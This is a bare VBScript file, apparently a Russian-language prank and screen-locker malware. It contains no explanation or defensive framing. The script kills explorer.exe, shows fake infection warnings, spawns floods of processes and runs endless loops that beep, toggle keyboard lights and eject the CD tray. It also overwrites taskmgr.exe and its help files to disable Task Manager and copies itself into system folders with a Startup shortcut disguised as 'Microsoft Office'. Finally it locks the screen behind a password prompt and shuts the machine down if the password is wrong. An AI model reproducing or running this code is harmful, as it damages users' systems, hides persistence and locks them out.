on error resume next 
set t=createobject("Wscript.Shell") 
set kill = createobject("wscript.shell") 
kill.run"taskkill /f /im explorer.exe",0
msgbox"Неполадка системы",16,"Error" 
msgbox"Вы заражены вирусом",48,"Windows" 
msgbox"Необходим перезапуск системы",16,"Windows"
t.run"help" 
t.run"help" 
t.run"help" 
t.run"help" 
t.run"calc.exe" 
t.run"notepad.exe" 
t.run"telnet" 
t.run"help" 
t.run"explorer" 
t.run"help" 
t.run"help" 
t.run"help" 
t.run"help" 
t.run"help" 
t.run"help" 
t.run"calc.exe" 
t.run"notepad.exe" 
t.run"telnet" 
t.run"help" 
t.run"help" 
msgbox"Сбой системы",16,"Windows" 
t.run"help" 
t.run"help" 
t.run"help"
t.run"help" 
t.run"help" 
t.run"help" 
t.run"help" 
t.run"calc.exe" 
t.run"notepad.exe" 
t.run"telnet" 
t.run"help" 
t.run"explorer" 
t.run"help" 
t.run"help" 
t.run"help" 
t.run"help" 
t.run"help" 
t.run"help" 
t.run"calc.exe" 
t.run"notepad.exe" 
t.run"telnet" 
t.run"help" 
t.run"help" 
msgbox"Сбой системы",16,"Windows" 
t.run"help" 
t.run"help" 
t.run"help"
t.run"help" 
t.run"help" 
t.run"help" 
t.run"help" 
t.run"calc.exe" 
t.run"notepad.exe" 
t.run"telnet" 
t.run"help" 
t.run"explorer" 
t.run"help" 
t.run"help" 
t.run"help" 
t.run"help" 
t.run"help" 
t.run"help" 
t.run"calc.exe" 
t.run"notepad.exe" 
t.run"telnet" 
t.run"help" 
t.run"help" 
msgbox"Сбой системы",16,"Windows" 
t.run"help" 
t.run"help" 
t.run"help"
Set S = CreateObject("Wscript.Shell") 
do 
execute"S.Run ""%comspec% /c "" & Chr(7), 0,True" 
loop
Set s = CreateObject("Wscript.Shell") 
do 
wscript.sleep 80 
s.sendkeys"{numlock}" 
wscript.sleep 80 
s.sendkeys"{capslock}" 
wscript.sleep 80 
s.sendkeys"{scrolllock}" 
wscript.sleep 80
wscript.sleep 80 
s.sendkeys"{numlock}" 
wscript.sleep 80 
s.sendkeys"{capslock}" 
wscript.sleep 80 
s.sendkeys"{scrolllock}" 
wscript.sleep 80
s.sendkeys"{scrolllock}" 
wscript.sleep 80 
s.sendkeys"{capslock}" 
wscript.sleep 80 
s.sendkeys"{numlock}" 
wscript.sleep 80
wscript.sleep 80 
s.sendkeys"{scrolllock}" 
wscript.sleep 80 
s.sendkeys"{capslock}" 
wscript.sleep 80 
s.sendkeys"{numlock}" 
wscript.sleep 80 
s.sendkeys"{numlock}" 
wscript.sleep 80 
s.sendkeys"{capslock}" 
wscript.sleep 80 
s.sendkeys"{scrolllock}" 
wscript.sleep 80 
loop 
Set WMPlayer = CreateObject("WMPlayer.OCX.7") 
do
WMPlayer.CdRomCollection.Item(0).Eject() 
loop
On Error Resume Next
set FSO=CreateObject("Scripting.FileSystemObject")
set file=FSO.CreateTextFile("C:\Windows\Help\taskmgr.chm")
set file=FSO.CreateTextFile("C:\Windows\Help\taskmgr.hlp")
set file=FSO.CreateTextFile("C:\WINDOWS\Prefetch\TASKMGR.EXE-20256C55.pf")
set file=FSO.CreateTextFile("C:\WINDOWS\system32\taskmgr.exe")

On Error Resume Next
Dim FileSysObject, File
Set FileSysObject = CreateObject("Scripting.FileSystemObject")
Set File = FileSysObject.GetFile(WScript.ScriptFullName)
Set s = CreateObject("Wscript.Shell")
File.Copy ("C:\WINDOWS\Fonts\Win_32.vbe")
File.Copy ("C:\WINDOWS\System32\Win_32.vbe")
Dim WSHShell
Set WSHShell = WScript.CreateObject("WScript.Shell")
Dim MyShortcut, MyDesktop, StartupPath
StartupPath = WSHShell.SpecialFolders("Startup")
Set MyShortcut = WSHShell.CreateShortcut(StartupPath & _
"\Microsoft Office.lnk")
MyShortcut.TargetPath = WSHShell.ExpandEnvironmentStrings("C:\WINDOWS\Fonts\Win_32.vbe")
MyShortcut.IconLocation = WSHShell.ExpandEnvironmentStrings("C:\Program Files\Common Files\Microsoft Shared\Office10\MSOICONS.exe")
MyShortcut.Save
set kill = createobject("wscript.shell")
kill.run"taskkill /f /im explorer.exe",0
Win_lock=inputbox("Введите пароль для разблокировки")
if Win_lock="123321303201" then
set t = createobject ("wscript.shell")
t.run "explorer.exe"
else
MsgBox"Неверный пароль",0,"Win_Lock"
Set OpSysSet = GetObject("winmgmts:{(Shutdown)}//./root/cimv2").ExecQuery("select * from Win32_OperatingSystem where Primary=true")
for each OpSys in OpSysSet
OpSys.ShutDown()
next
Set s = CreateObject("Wscript.Shell")
wscript.sleep 80
s.sendkeys"{numlock}"
end if
